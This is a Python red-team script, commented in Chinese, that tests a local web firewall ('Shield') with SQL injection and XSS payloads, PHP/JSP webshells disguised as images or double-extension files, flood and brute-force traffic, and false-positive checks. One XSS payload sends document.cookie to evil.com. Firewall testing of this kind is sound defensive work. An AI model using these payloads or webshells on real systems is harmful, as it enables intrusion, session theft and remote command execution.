#!/usr/bin/env python3
"""
Round 7 红队全方位攻击测试脚本
测试目标: http://localhost:8081 (Shield防火墙)
核心指标: 攻击类型识别准确率（拦截时必须正确标注类型）

测试内容:
  1. SQL注入 — 布尔盲注、报错注入、联合查询、时间盲注、注释绕过、编码绕过、无空格注入
  2. XSS攻击 — 反射型、存储型、DOM型、事件处理器绕过、编码绕过
  3. 一句话木马上传 — PHP木马、JSP木马、WebShell文件上传、图片马、双后缀绕过
  4. CC攻击 — HTTP并发压测，正常并发 vs 恶意CC区分
  5. DDoS模拟 — 应用层HTTP Flood（控制速率）
  6. 爆破攻击 — 登录接口字典爆破、目录扫描
  7. 误报测试 — 正常请求是否被误杀

资源限制: CPU≤1核, 内存≤1GB
"""

import requests
import time
import json
import concurrent.futures
import statistics
import base64
from urllib.parse import quote

TARGET = "http://localhost:8081"
ADMIN = "http://localhost:9090"
RESULTS = {}

# ===================== 辅助函数 =====================

def send_get(path="/", params=None, headers=None):
    try:
        r = requests.get(TARGET + path, params=params, headers=headers, timeout=10)
        return r.status_code, r.text, r.elapsed.total_seconds(), dict(r.headers)
    except Exception as e:
        return -1, str(e), 0.0, {}

def send_post(path="/", data=None, headers=None, files=None):
    try:
        r = requests.post(TARGET + path, data=data, headers=headers, files=files, timeout=10)
        return r.status_code, r.text, r.elapsed.total_seconds(), dict(r.headers)
    except Exception as e:
        return -1, str(e), 0.0, {}

def is_blocked(status, text):
    if status in (403, 429, 406, 400, 503):
        return True
    text_lower = text.lower()
    # 排除正常页面中的WAF关键词（如"Shield WAF Test Page"）
    if "shield waf test page" in text_lower or "waf reverse proxy" in text_lower:
        return False
    if "block" in text_lower or "forbidden" in text_lower or "waf" in text_lower or "too many" in text_lower:
        return True
    return False

def detect_attack_type(status, text, headers, metrics_before, metrics_after):
    """
    通过多种方式推断攻击类型：
    1. 检查响应头中的 X-Block-Reason
    2. 检查响应body中的关键词
    3. 检查metrics变化
    4. 检查日志关键词（通过响应推断）
    """
    # 1. 响应头
    block_reason = headers.get("X-Block-Reason", "").lower()
    if "sql" in block_reason:
        return "SQL注入"
    if "xss" in block_reason:
        return "XSS"
    if "cc" in block_reason:
        return "CC攻击"
    if "ddos" in block_reason or "rate" in block_reason:
        return "DDoS"
    if "brute" in block_reason:
        return "爆破攻击"
    if "upload" in block_reason or "shell" in block_reason or "webshell" in block_reason:
        return "木马上传"

    # 2. 响应body关键词
    text_lower = text.lower()
    if "sql" in text_lower and ("inject" in text_lower or "injection" in text_lower):
        return "SQL注入"
    if "xss" in text_lower:
        return "XSS"
    if "cc" in text_lower and "attack" in text_lower:
        return "CC攻击"
    if "ddos" in text_lower:
        return "DDoS"
    if "brute" in text_lower:
        return "爆破攻击"
    if "upload" in text_lower and ("shell" in text_lower or "webshell" in text_lower or "malicious" in text_lower):
        return "木马上传"

    # 3. metrics变化推断
    if metrics_before and metrics_after:
        if metrics_after.get("sql_injections", 0) > metrics_before.get("sql_injections", 0):
            return "SQL注入"
        if metrics_after.get("xss_attempts", 0) > metrics_before.get("xss_attempts", 0):
            return "XSS"
        if metrics_after.get("brute_force_blocks", 0) > metrics_before.get("brute_force_blocks", 0):
            return "爆破攻击"
        if metrics_after.get("ddos_blocks", 0) > metrics_before.get("ddos_blocks", 0):
            # DDoS和CC都使用ddos_blocks，需要进一步区分
            if status == 429:
                return "CC攻击"  # CC通常是429
            return "DDoS"

    # 4. 状态码推断
    if status == 429:
        return "CC攻击"  # 默认429为CC
    if status == 403:
        return "未知"  # 403可能是SQL/XSS/木马上传

    return "未知"

def get_metrics():
    try:
        r = requests.get(ADMIN + "/stats", timeout=5)
        return r.json()
    except Exception:
        return {}

def reset_metrics():
    # 没有reset API，通过记录基准值来对比
    pass

def reset_cc():
    # 没有reset API，等待窗口过期
    pass

def reset_blacklist():
    try:
        requests.post(ADMIN + "/blacklist", json={"ip": "127.0.0.1", "reason": "reset", "duration_sec": 1}, timeout=5)
    except Exception:
        pass

# ===================== SQL注入测试 =====================

def test_sql_injection():
    print("\n[+] SQL注入测试开始...")
    cases = []

    # Union-Based
    union_payloads = [
        ("union_basic", "1' UNION SELECT username, password FROM users--"),
        ("union_all_null", "1' UNION ALL SELECT null, version()--"),
        ("union_info_schema", "' UNION SELECT * FROM information_schema.tables--"),
        ("union_numeric", "-1 UNION SELECT 1,2,3--"),
        ("union_load_file", "1' UNION SELECT null, load_file('/etc/passwd')--"),
    ]
    for name, payload in union_payloads:
        cases.append({"name": name, "payload": payload, "method": "GET", "expected_type": "SQL注入", "category": "union_based"})

    # Error-Based
    error_payloads = [
        ("error_extractvalue", "1' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--"),
        ("error_updatexml", "1' AND updatexml(1, concat(0x7e, (SELECT database())), 1)--"),
    ]
    for name, payload in error_payloads:
        cases.append({"name": name, "payload": payload, "method": "GET", "expected_type": "SQL注入", "category": "error_based"})

    # Boolean-Based Blind
    bool_payloads = [
        ("bool_1eq1", "1' AND 1=1--"),
        ("bool_ascii_sub", "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"),
    ]
    for name, payload in bool_payloads:
        cases.append({"name": name, "payload": payload, "method": "GET", "expected_type": "SQL注入", "category": "boolean_blind"})

    # Time-Based Blind
    time_payloads = [
        ("time_sleep", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
        ("time_benchmark", "1' AND benchmark(10000000, md5('test'))--"),
    ]
    for name, payload in time_payloads:
        cases.append({"name": name, "payload": payload, "method": "GET", "expected_type": "SQL注入", "category": "time_blind"})

    # Comment Bypass
    comment_payloads = [
        ("comment_block", "1/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"),
        ("comment_mysql_hint", "1'/*!50000UNION*/ SELECT username, password FROM users--"),
    ]
    for name, payload in comment_payloads:
        cases.append({"name": name, "payload": payload, "method": "GET", "expected_type": "SQL注入", "category": "comment_bypass"})

    # Encoding Bypass
    encoding_payloads = [
        ("enc_url_encode", "1%27%20UNION%20SELECT%20*%20FROM%20users--"),
        ("enc_double_url", "1%2527 UNION SELECT * FROM users--"),
    ]
    for name, payload in encoding_payloads:
        cases.append({"name": name, "payload": payload, "method": "GET", "expected_type": "SQL注入", "category": "encoding_bypass"})

    # No-Space / Logic
    logic_payloads = [
        ("nospace_paren_or", "1'OR(1)=(1)"),
        ("nospace_comment", "1'/**/OR/**/'1'='1"),
        ("url_pipe", "1'%7C%7C'1'='1"),
        ("vt_space_or", "1'%0bOR%0b'1'='1"),
    ]
    for name, payload in logic_payloads:
        cases.append({"name": name, "payload": payload, "method": "GET", "expected_type": "SQL注入", "category": "logic_or_nospace"})

    # POST方法
    post_payloads = [
        ("post_basic_or", "1' OR '1'='1"),
        ("post_union", "1' UNION SELECT * FROM users--"),
        ("post_sleep", "1' AND SLEEP(5)--"),
    ]
    for name, payload in post_payloads:
        cases.append({"name": name, "payload": payload, "method": "POST", "expected_type": "SQL注入", "category": "post_method"})

    return run_attack_cases(cases, "/search", "SQL注入")

# ===================== XSS攻击测试 =====================

def test_xss():
    print("\n[+] XSS攻击测试开始...")
    cases = [
        ("xss_script_tag", "<script>alert(1)</script>", "反射型"),
        ("xss_img_onerror", "<img src=x onerror=alert(1)>", "反射型"),
        ("xss_javascript_proto", "javascript:alert(1)", "反射型"),
        ("xss_onmouseover", "<div onmouseover=alert(1)>hover</div>", "反射型"),
        ("xss_svg_onload", "<svg onload=alert(1)>", "反射型"),
        ("xss_iframe_src", "<iframe src='javascript:alert(1)'></iframe>", "反射型"),
        ("xss_encoded_script", "%3Cscript%3Ealert(1)%3C/script%3E", "反射型"),
        ("xss_double_encoded", "%253Cscript%253Ealert(1)%253C%252Fscript%253E", "反射型"),
        ("xss_event_handler", "<body onload=alert(1)>", "事件处理器绕过"),
        ("xss_dom_innerhtml", "<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", "DOM型"),
        ("xss_storage_comment", "<script>fetch('http://evil.com?c='+document.cookie)</script>", "存储型"),
        ("xss_encoding_html", "&#60;script&#62;alert(1)&#60;/script&#62;", "编码绕过"),
        ("xss_vbscript", "vbscript:msgbox(1)", "反射型"),
        ("xss_data_uri", "data:text/html,<script>alert(1)</script>", "反射型"),
    ]

    attack_cases = []
    for name, payload, subtype in cases:
        attack_cases.append({
            "name": name,
            "payload": payload,
            "method": "GET",
            "expected_type": "XSS",
            "category": subtype
        })

    return run_attack_cases(attack_cases, "/search", "XSS")

# ===================== 一句话木马上传测试 =====================

def test_webshell_upload():
    print("\n[+] 一句话木马上传测试开始...")
    cases = []

    # PHP木马
    php_shells = [
        ("php_eval_post", "<?php eval($_POST['cmd']); ?>", "php"),
        ("php_assert", "<?php assert($_REQUEST['cmd']); ?>", "php"),
        ("php_system", "<?php system($_GET['cmd']); ?>", "php"),
        ("php_passthru", "<?php passthru($_POST['x']); ?>", "php"),
        ("php_shell_exec", "<?php echo shell_exec($_GET['c']); ?>", "php"),
    ]
    for name, content, ext in php_shells:
        cases.append({
            "name": name,
            "payload": content,
            "method": "POST_UPLOAD",
            "expected_type": "木马上传",
            "category": "php_shell",
            "filename": f"shell.{ext}",
            "content_type": "application/x-php"
        })

    # JSP木马
    jsp_shells = [
        ("jsp_runtime", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "jsp"),
        ("jsp_processbuilder", "<% new ProcessBuilder(\"bash\", \"-c\", request.getParameter(\"c\")).start(); %>", "jsp"),
    ]
    for name, content, ext in jsp_shells:
        cases.append({
            "name": name,
            "payload": content,
            "method": "POST_UPLOAD",
            "expected_type": "木马上传",
            "category": "jsp_shell",
            "filename": f"shell.{ext}",
            "content_type": "application/x-jsp"
        })

    # 双后缀绕过
    double_ext = [
        ("php_double_jpg", "<?php eval($_POST['x']); ?>", "shell.php.jpg"),
        ("php_double_png", "<?php system($_GET['c']); ?>", "shell.php.png"),
        ("jsp_double_txt", "<% out.println(\"hacked\"); %>", "shell.jsp.txt"),
    ]
    for name, content, filename in double_ext:
        cases.append({
            "name": name,
            "payload": content,
            "method": "POST_UPLOAD",
            "expected_type": "木马上传",
            "category": "double_extension",
            "filename": filename,
            "content_type": "image/jpeg"
        })

    # 图片马
    image_horses = [
        ("img_php_gif", "GIF89a<?php eval($_POST['x']); ?>", "horse.gif"),
        ("img_php_png", "\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>", "horse.png"),
        ("img_php_jpg", "\xff\xd8\xff\xe0<?php assert($_REQUEST['cmd']); ?>", "horse.jpg"),
    ]
    for name, content, filename in image_horses:
        cases.append({
            "name": name,
            "payload": content,
            "method": "POST_UPLOAD",
            "expected_type": "木马上传",
            "category": "image_horse",
            "filename": filename,
            "content_type": "image/jpeg"
        })

    # 直接POST body上传（非multipart）
    direct_uploads = [
        ("direct_php", "<?php @eval($_POST['x']); ?>", "shell.php"),
        ("direct_jsp", "<% out.println(request.getParameter(\"x\")); %>", "shell.jsp"),
    ]
    for name, content, filename in direct_uploads:
        cases.append({
            "name": name,
            "payload": content,
            "method": "POST_RAW",
            "expected_type": "木马上传",
            "category": "direct_upload",
            "filename": filename,
            "content_type": "application/x-php"
        })

    blocked = 0
    passed = 0
    penetrated = []
    misidentified = []
    latencies = []
    category_stats = {}

    for case in cases:
        metrics_before = get_metrics()
        time.sleep(0.05)

        if case["method"] == "POST_UPLOAD":
            files = {"file": (case["filename"], case["payload"], case["content_type"])}
            status, text, latency, headers = send_post("/upload", files=files)
        else:
            headers = {"Content-Type": case["content_type"], "X-Filename": case["filename"]}
            status, text, latency, headers = send_post("/upload", data=case["payload"], headers=headers)

        latencies.append(latency)
        blocked_flag = is_blocked(status, text)

        metrics_after = get_metrics()
        detected_type = detect_attack_type(status, text, headers, metrics_before, metrics_after)

        if blocked_flag:
            blocked += 1
            if detected_type != case["expected_type"] and detected_type != "未知":
                misidentified.append({
                    "name": case["name"],
                    "expected": case["expected_type"],
                    "detected": detected_type,
                    "payload": case["payload"][:80],
                    "status": status
                })

        if blocked_flag == True:  # 期望被拦截
            passed += 1
        else:
            penetrated.append({
                "name": case["name"],
                "payload": case["payload"][:80],
                "status": status,
                "category": case["category"]
            })

        cat = case["category"]
        if cat not in category_stats:
            category_stats[cat] = {"total": 0, "blocked": 0, "penetrated": 0, "misidentified": 0}
        category_stats[cat]["total"] += 1
        if blocked_flag:
            category_stats[cat]["blocked"] += 1
        else:
            category_stats[cat]["penetrated"] += 1
        if blocked_flag and detected_type != case["expected_type"] and detected_type != "未知":
            category_stats[cat]["misidentified"] += 1

        print(f"  [{case['method']}] {case['name']}: status={status}, blocked={blocked_flag}, detected={detected_type}, cat={case['category']}")
        time.sleep(0.1)

    total = len(cases)
    block_rate = blocked / total * 100 if total else 0
    pass_rate = passed / total * 100 if total else 0
    accuracy = (blocked - len(misidentified)) / blocked * 100 if blocked else 0

    print(f"\n  木马上传测试结果: 总数={total}, 拦截={blocked}, 穿透={len(penetrated)}, 识别错误={len(misidentified)}")
    print(f"  拦截率: {block_rate:.1f}%, 识别准确率: {accuracy:.1f}%")

    return {
        "total": total,
        "blocked": blocked,
        "penetrated": len(penetrated),
        "misidentified": len(misidentified),
        "block_rate": block_rate,
        "accuracy": accuracy,
        "penetrated_details": penetrated,
        "misidentified_details": misidentified,
        "category_stats": category_stats,
    }

# ===================== CC攻击测试 =====================

def test_cc_attack():
    print("\n[+] CC攻击测试开始...")

    # 等待CC窗口重置
    time.sleep(2)

    results = {}

    # 1. 正常请求基准
    print("  测试1: 正常请求基准（不同URL，20次）")
    normal_blocked = 0
    normal_latencies = []
    for i in range(20):
        status, text, latency, headers = send_get(f"/page{i%5}")
        normal_latencies.append(latency)
        if is_blocked(status, text):
            normal_blocked += 1
        time.sleep(0.3)
    results["normal_requests"] = {
        "total": 20,
        "blocked": normal_blocked,
        "avg_latency": statistics.mean(normal_latencies) if normal_latencies else 0,
    }
    print(f"    正常请求: 拦截={normal_blocked}/20")

    # 2. 同URL高频访问（模拟CC）
    print("  测试2: 同URL高频访问（100次/60s，模拟CC）")
    cc_blocked = 0
    cc_statuses = []
    cc_latencies = []
    cc_detected_types = []
    for i in range(120):
        metrics_before = get_metrics()
        status, text, latency, headers = send_get("/cc-target")
        metrics_after = get_metrics()
        cc_statuses.append(status)
        cc_latencies.append(latency)
        if is_blocked(status, text):
            cc_blocked += 1
            detected = detect_attack_type(status, text, headers, metrics_before, metrics_after)
            cc_detected_types.append(detected)
        time.sleep(0.3)

    # 统计CC识别准确率
    cc_correct = sum(1 for t in cc_detected_types if t in ("CC攻击", "DDoS"))
    results["cc_same_url"] = {
        "total": 100,
        "blocked": cc_blocked,
        "first_block_idx": next((i for i, s in enumerate(cc_statuses) if s in (403, 429)), -1),
        "avg_latency": statistics.mean(cc_latencies) if cc_latencies else 0,
        "detected_types": list(set(cc_detected_types)),
        "correct_identification": cc_correct,
    }
    print(f"    CC同URL: 拦截={cc_blocked}/120, 首次拦截索引={results['cc_same_url']['first_block_idx']}, 识别类型={set(cc_detected_types)}")

    # 3. 并发请求压测
    print("  测试3: 并发请求压测（20并发，50请求）")
    concurrent_blocked = 0
    concurrent_latencies = []
    concurrent_types = []
    def fetch_one():
        mb = get_metrics()
        status, text, latency, headers = send_get("/concurrent-test")
        ma = get_metrics()
        return status, text, latency, headers, mb, ma

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(fetch_one) for _ in range(50)]
        for future in concurrent.futures.as_completed(futures):
            status, text, latency, headers, mb, ma = future.result()
            concurrent_latencies.append(latency)
            if is_blocked(status, text):
                concurrent_blocked += 1
                concurrent_types.append(detect_attack_type(status, text, headers, mb, ma))

    results["cc_concurrent"] = {
        "total": 50,
        "blocked": concurrent_blocked,
        "avg_latency": statistics.mean(concurrent_latencies) if concurrent_latencies else 0,
        "detected_types": list(set(concurrent_types)),
    }
    print(f"    并发压测: 拦截={concurrent_blocked}/50, 类型={set(concurrent_types)}")

    return results

# ===================== DDoS模拟测试 =====================

def test_ddos():
    print("\n[+] DDoS模拟测试开始...")

    # 等待窗口重置
    time.sleep(2)

    results = {}

    # 1. 阈值附近流量（RPS=100, burst=300）
    print("  测试1: 阈值附近流量（150请求，约50RPS）")
    ddos_blocked = 0
    ddos_types = []
    ddos_latencies = []
    for i in range(150):
        metrics_before = get_metrics()
        status, text, latency, headers = send_get("/ddos-test")
        metrics_after = get_metrics()
        ddos_latencies.append(latency)
        if is_blocked(status, text):
            ddos_blocked += 1
            detected = detect_attack_type(status, text, headers, metrics_before, metrics_after)
            ddos_types.append(detected)
        time.sleep(0.02)  # 50 RPS

    correct_ddos = sum(1 for t in ddos_types if t in ("DDoS", "CC攻击"))
    results["threshold_flood"] = {
        "total": 150,
        "blocked": ddos_blocked,
        "avg_latency": statistics.mean(ddos_latencies) if ddos_latencies else 0,
        "detected_types": list(set(ddos_types)),
        "correct_identification": correct_ddos,
    }
    print(f"    阈值附近: 拦截={ddos_blocked}/150, 类型={set(ddos_types)}")

    # 2. 突发流量测试
    print("  测试2: 突发流量测试（300请求，100并发）")
    burst_blocked = 0
    burst_types = []
    burst_latencies = []
    def fetch_burst():
        mb = get_metrics()
        status, text, latency, headers = send_get("/burst-test")
        ma = get_metrics()
        return status, text, latency, headers, mb, ma

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(fetch_burst) for _ in range(300)]
        for future in concurrent.futures.as_completed(futures):
            status, text, latency, headers, mb, ma = future.result()
            burst_latencies.append(latency)
            if is_blocked(status, text):
                burst_blocked += 1
                burst_types.append(detect_attack_type(status, text, headers, mb, ma))

    correct_burst = sum(1 for t in burst_types if t in ("DDoS", "CC攻击"))
    results["burst_flood"] = {
        "total": 300,
        "blocked": burst_blocked,
        "avg_latency": statistics.mean(burst_latencies) if burst_latencies else 0,
        "detected_types": list(set(burst_types)),
        "correct_identification": correct_burst,
    }
    print(f"    突发流量: 拦截={burst_blocked}/300, 类型={set(burst_types)}")

    return results

# ===================== 爆破攻击测试 =====================

def test_brute_force():
    print("\n[+] 爆破攻击测试开始...")

    # 等待窗口重置
    time.sleep(2)

    results = {}

    # 1. 登录接口字典爆破
    print("  测试1: 登录接口字典爆破（/login, 10次错误密码）")
    login_blocked = 0
    login_types = []
    passwords = ["admin", "password", "123456", "qwerty", "letmein", "monkey", "dragon", "master", "sunshine", "princess"]
    for i, pwd in enumerate(passwords):
        metrics_before = get_metrics()
        status, text, latency, headers = send_post("/login", data={"username": "admin", "password": pwd})
        metrics_after = get_metrics()
        if is_blocked(status, text):
            login_blocked += 1
            detected = detect_attack_type(status, text, headers, metrics_before, metrics_after)
            login_types.append(detected)
        print(f"    尝试 {i+1}: status={status}, blocked={is_blocked(status, text)}")
        time.sleep(0.2)

    correct_login = sum(1 for t in login_types if t in ("爆破攻击",))
    results["login_bruteforce"] = {
        "total": len(passwords),
        "blocked": login_blocked,
        "detected_types": list(set(login_types)),
        "correct_identification": correct_login,
    }
    print(f"    登录爆破: 拦截={login_blocked}/{len(passwords)}, 类型={set(login_types)}")

    # 2. API认证接口爆破
    print("  测试2: API认证接口爆破（/api/auth, 8次错误token）")
    api_blocked = 0
    api_types = []
    tokens = ["token1", "token2", "token3", "token4", "token5", "token6", "token7", "token8"]
    for i, token in enumerate(tokens):
        metrics_before = get_metrics()
        status, text, latency, headers = send_post("/api/auth", data={"token": token}, headers={"Authorization": f"Bearer {token}"})
        metrics_after = get_metrics()
        if is_blocked(status, text):
            api_blocked += 1
            detected = detect_attack_type(status, text, headers, metrics_before, metrics_after)
            api_types.append(detected)
        time.sleep(0.2)

    correct_api = sum(1 for t in api_types if t in ("爆破攻击",))
    results["api_bruteforce"] = {
        "total": len(tokens),
        "blocked": api_blocked,
        "detected_types": list(set(api_types)),
        "correct_identification": correct_api,
    }
    print(f"    API爆破: 拦截={api_blocked}/{len(tokens)}, 类型={set(api_types)}")

    # 3. 目录扫描
    print("  测试3: 目录扫描（/admin, 15个敏感路径）")
    dir_blocked = 0
    dir_types = []
    paths = ["/admin", "/admin/login", "/admin/config", "/wp-admin", "/phpmyadmin", "/manager", "/console", "/api/v1/users", "/.env", "/config.php", "/backup.zip", "/.git/config", "/robots.txt", "/sitemap.xml", "/api/internal"]
    for i, path in enumerate(paths):
        metrics_before = get_metrics()
        status, text, latency, headers = send_get(path)
        metrics_after = get_metrics()
        if is_blocked(status, text):
            dir_blocked += 1
            detected = detect_attack_type(status, text, headers, metrics_before, metrics_after)
            dir_types.append(detected)
        time.sleep(0.15)

    correct_dir = sum(1 for t in dir_types if t in ("爆破攻击",))
    results["dir_scan"] = {
        "total": len(paths),
        "blocked": dir_blocked,
        "detected_types": list(set(dir_types)),
        "correct_identification": correct_dir,
    }
    print(f"    目录扫描: 拦截={dir_blocked}/{len(paths)}, 类型={set(dir_types)}")

    return results

# ===================== 误报测试 =====================

def test_false_positives():
    print("\n[+] 误报测试开始...")
    cases = []

    normal_requests = [
        ("fp_normal_get", "/", "GET", None, None),
        ("fp_normal_search", "/search", "GET", {"q": "laptop"}, None),
        ("fp_chinese", "/search", "GET", {"q": "如何学习SQL数据库"}, None),
        ("fp_code", "/search", "GET", {"q": "def hello(): print('Hello World')"}, None),
        ("fp_legal_url", "/search", "GET", {"q": "https://example.com/search?q=hello"}, None),
        ("fp_graphql", "/graphql", "POST", None, {"Content-Type": "application/json", "data": '{"query": "query GetUser($id: ID!) { user(id: $id) { name } }", "variables": {"id": "123"}}'}),
        ("fp_json_post", "/api/data", "POST", None, {"Content-Type": "application/json", "data": '{"name": "test", "value": 123}'}),
        ("fp_form_post", "/contact", "POST", None, {"Content-Type": "application/x-www-form-urlencoded", "data": "name=test&email=test@example.com&message=hello"}),
        ("fp_image_request", "/images/logo.png", "GET", None, None),
        ("fp_css_request", "/style.css", "GET", None, None),
    ]

    for name, path, method, params, extra in normal_requests:
        cases.append({"name": name, "path": path, "method": method, "params": params, "extra": extra})

    fp_count = 0
    fp_details = []
    latencies = []

    for case in cases:
        if case["method"] == "GET":
            status, text, latency, headers = send_get(case["path"], params=case.get("params"))
        else:
            headers = case["extra"].get("Content-Type", "application/x-www-form-urlencoded") if case["extra"] else "application/x-www-form-urlencoded"
            data = case["extra"].get("data", "") if case["extra"] else ""
            h = {"Content-Type": headers}
            status, text, latency, headers = send_post(case["path"], data=data, headers=h)

        latencies.append(latency)
        blocked_flag = is_blocked(status, text)
        if blocked_flag:
            fp_count += 1
            fp_details.append({
                "name": case["name"],
                "status": status,
                "path": case["path"]
            })
        print(f"  [{case['method']}] {case['name']}: status={status}, blocked={blocked_flag}")
        time.sleep(0.1)

    total = len(cases)
    fp_rate = fp_count / total * 100 if total else 0
    print(f"\n  误报测试结果: 总数={total}, 误报={fp_count}, 误报率={fp_rate:.1f}%")

    return {
        "total": total,
        "fp_count": fp_count,
        "fp_rate": fp_rate,
        "fp_details": fp_details,
        "avg_latency": statistics.mean(latencies) if latencies else 0,
    }

# ===================== 通用攻击执行函数 =====================

def run_attack_cases(cases, path, expected_attack_type):
    blocked = 0
    passed = 0
    penetrated = []
    misidentified = []
    latencies = []
    category_stats = {}

    for case in cases:
        metrics_before = get_metrics()
        time.sleep(0.05)

        if case["method"] == "GET":
            status, text, latency, headers = send_get(path, params={"q": case["payload"]})
        else:
            status, text, latency, headers = send_post(path, data={"q": case["payload"]}, headers={"Content-Type": "application/x-www-form-urlencoded"})

        latencies.append(latency)
        blocked_flag = is_blocked(status, text)

        metrics_after = get_metrics()
        detected_type = detect_attack_type(status, text, headers, metrics_before, metrics_after)

        if blocked_flag:
            blocked += 1
            if detected_type != case["expected_type"] and detected_type != "未知":
                misidentified.append({
                    "name": case["name"],
                    "expected": case["expected_type"],
                    "detected": detected_type,
                    "payload": case["payload"][:80],
                    "status": status
                })

        if blocked_flag == True:
            passed += 1
        else:
            penetrated.append({
                "name": case["name"],
                "payload": case["payload"][:80],
                "status": status,
                "category": case["category"]
            })

        cat = case["category"]
        if cat not in category_stats:
            category_stats[cat] = {"total": 0, "blocked": 0, "penetrated": 0, "misidentified": 0}
        category_stats[cat]["total"] += 1
        if blocked_flag:
            category_stats[cat]["blocked"] += 1
        else:
            category_stats[cat]["penetrated"] += 1
        if blocked_flag and detected_type != case["expected_type"] and detected_type != "未知":
            category_stats[cat]["misidentified"] += 1

        print(f"  [{case['method']}] {case['name']}: status={status}, blocked={blocked_flag}, detected={detected_type}, cat={case['category']}")
        time.sleep(0.1)

    total = len(cases)
    block_rate = blocked / total * 100 if total else 0
    pass_rate = passed / total * 100 if total else 0
    accuracy = (blocked - len(misidentified)) / blocked * 100 if blocked else 0

    print(f"\n  {expected_attack_type}测试结果: 总数={total}, 拦截={blocked}, 穿透={len(penetrated)}, 识别错误={len(misidentified)}")
    print(f"  拦截率: {block_rate:.1f}%, 识别准确率: {accuracy:.1f}%")

    return {
        "total": total,
        "blocked": blocked,
        "penetrated": len(penetrated),
        "misidentified": len(misidentified),
        "block_rate": block_rate,
        "accuracy": accuracy,
        "penetrated_details": penetrated,
        "misidentified_details": misidentified,
        "category_stats": category_stats,
    }

# ===================== 主函数 =====================

def main():
    print("=" * 70)
    print("Shield 防火墙 Round 7 红队全方位攻击测试")
    print(f"目标: {TARGET}")
    print("核心指标: 攻击类型识别准确率")
    print("=" * 70)

    # 确认目标可达
    status, text, _, _ = send_get("/")
    if status not in (200, 404):
        print(f"[!] 目标不可达: status={status}")
        return
    print(f"[*] 目标可达: status={status}")

    # 获取初始metrics
    initial_metrics = get_metrics()
    print(f"[*] 初始metrics: {json.dumps(initial_metrics, indent=2)}")

    results = {}

    # 1. SQL注入测试
    results["sql_injection"] = test_sql_injection()
    time.sleep(3)

    # 2. XSS攻击测试
    results["xss"] = test_xss()
    time.sleep(3)

    # 3. 木马上传测试
    results["webshell_upload"] = test_webshell_upload()
    time.sleep(3)

    # 4. CC攻击测试
    results["cc_attack"] = test_cc_attack()
    time.sleep(3)

    # 5. DDoS模拟测试
    results["ddos"] = test_ddos()
    time.sleep(3)

    # 6. 爆破攻击测试
    results["brute_force"] = test_brute_force()
    time.sleep(3)

    # 7. 误报测试
    results["false_positive"] = test_false_positives()

    # 汇总
    print("\n" + "=" * 70)
    print("Round 7 攻击测试汇总")
    print("=" * 70)

    sql = results["sql_injection"]
    xss = results["xss"]
    shell = results["webshell_upload"]
    cc = results["cc_attack"]
    ddos = results["ddos"]
    brute = results["brute_force"]
    fp = results["false_positive"]

    print(f"SQL注入: 总数={sql['total']}, 拦截={sql['blocked']}, 穿透={sql['penetrated']}, 拦截率={sql['block_rate']:.1f}%, 识别准确率={sql['accuracy']:.1f}%")
    print(f"XSS攻击: 总数={xss['total']}, 拦截={xss['blocked']}, 穿透={xss['penetrated']}, 拦截率={xss['block_rate']:.1f}%, 识别准确率={xss['accuracy']:.1f}%")
    print(f"木马上传: 总数={shell['total']}, 拦截={shell['blocked']}, 穿透={shell['penetrated']}, 拦截率={shell['block_rate']:.1f}%, 识别准确率={shell['accuracy']:.1f}%")
    print(f"CC攻击: 同URL={cc['cc_same_url']['blocked']}/120, 并发={cc['cc_concurrent']['blocked']}/50")
    print(f"DDoS模拟: 阈值附近={ddos['threshold_flood']['blocked']}/150, 突发={ddos['burst_flood']['blocked']}/300")
    print(f"爆破攻击: 登录={brute['login_bruteforce']['blocked']}/10, API={brute['api_bruteforce']['blocked']}/8, 目录={brute['dir_scan']['blocked']}/15")
    print(f"误报测试: 总数={fp['total']}, 误报={fp['fp_count']}, 误报率={fp['fp_rate']:.1f}%")

    # 验收标准检查
    print("\n" + "=" * 70)
    print("验收标准检查")
    print("=" * 70)

    sql_pass = sql["block_rate"] >= 95.0
    xss_pass = xss["block_rate"] >= 95.0
    shell_pass = shell["block_rate"] >= 95.0
    ddos_pass = (ddos["threshold_flood"]["blocked"] + ddos["burst_flood"]["blocked"]) > 0
    brute_pass = (brute["login_bruteforce"]["blocked"] + brute["api_bruteforce"]["blocked"]) > 0
    fp_pass = fp["fp_rate"] < 2.0

    # 攻击类型识别准确率检查
    sql_acc_pass = sql["accuracy"] >= 95.0
    xss_acc_pass = xss["accuracy"] >= 95.0
    shell_acc_pass = shell["accuracy"] >= 95.0

    print(f"SQL注入拦截率 >= 95%: {'✅ PASS' if sql_pass else '❌ FAIL'} ({sql['block_rate']:.1f}%)")
    print(f"XSS拦截率 >= 95%: {'✅ PASS' if xss_pass else '❌ FAIL'} ({xss['block_rate']:.1f}%)")
    print(f"木马上传拦截率 >= 95%: {'✅ PASS' if shell_pass else '❌ FAIL'} ({shell['block_rate']:.1f}%)")
    print(f"DDoS模拟有拦截: {'✅ PASS' if ddos_pass else '❌ FAIL'}")
    print(f"爆破攻击有拦截: {'✅ PASS' if brute_pass else '❌ FAIL'}")
    print(f"误报率 < 2%: {'✅ PASS' if fp_pass else '❌ FAIL'} ({fp['fp_rate']:.1f}%)")
    print(f"SQL注入识别准确率 >= 95%: {'✅ PASS' if sql_acc_pass else '❌ FAIL'} ({sql['accuracy']:.1f}%)")
    print(f"XSS识别准确率 >= 95%: {'✅ PASS' if xss_acc_pass else '❌ FAIL'} ({xss['accuracy']:.1f}%)")
    print(f"木马上传识别准确率 >= 95%: {'✅ PASS' if shell_acc_pass else '❌ FAIL'} ({shell['accuracy']:.1f}%)")

    results["acceptance"] = {
        "sql_pass": sql_pass,
        "xss_pass": xss_pass,
        "shell_pass": shell_pass,
        "ddos_pass": ddos_pass,
        "brute_pass": brute_pass,
        "fp_pass": fp_pass,
        "sql_acc_pass": sql_acc_pass,
        "xss_acc_pass": xss_acc_pass,
        "shell_acc_pass": shell_acc_pass,
        "overall_pass": sql_pass and xss_pass and shell_pass and ddos_pass and brute_pass and fp_pass,
    }

    # 保存详细报告
